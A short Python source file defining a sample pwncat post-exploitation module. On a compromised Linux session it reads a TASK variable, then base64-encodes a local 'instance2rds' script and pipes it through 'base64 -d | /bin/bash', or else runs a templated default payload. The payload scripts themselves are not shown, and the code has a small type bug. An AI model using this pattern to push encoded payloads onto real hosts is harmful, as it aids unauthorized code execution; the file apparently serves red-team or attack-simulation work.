#!/usr/bin/env python3
from io import StringIO

import time
from pwncat import util
from pwncat.modules import Status, BaseModule, ModuleFailed, Argument
from pwncat.manager import Session
from pwncat.platform.linux import Linux
from pathlib import Path
import base64


class Module(BaseModule):
    """ Sample custom module """

    """
    Usage: run sample 
    """
    PLATFORM = [Linux]
    ARGUMENTS = {}

    def run(self, session: Session):
        yield Status( "preparing to pwn the [red]world[/red]")
        session.log(session.platform.getenv("TASK"))
        task_name = session.platform.getenv("TASK")
        if task_name == "instance2rds":
            payload = base64.b64encode(Path('resources/instance2rds.sh').read_text())
            result = session.platform.run(f"echo {payload} | base64 -d | /bin/bash -")
            session.log(result)
        else:
            result = session.platform.run("${default_payload}")
            session.log(result)

        session.log( f"ran {self.name}")